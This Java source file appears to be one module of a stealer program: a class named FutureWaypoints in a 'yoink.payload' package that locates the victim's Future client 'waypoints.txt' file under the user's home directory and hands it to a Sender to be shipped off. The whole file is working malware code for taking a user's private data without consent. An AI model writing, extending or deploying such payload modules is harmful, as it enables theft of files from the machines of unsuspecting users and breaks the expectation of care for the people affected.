package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final
class FutureWaypoints implements Payload {
    @Override
    public
    void execute () {
        Optional <File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\" + "waypoints.txt");
        file.ifPresent(Sender::send);
    }
}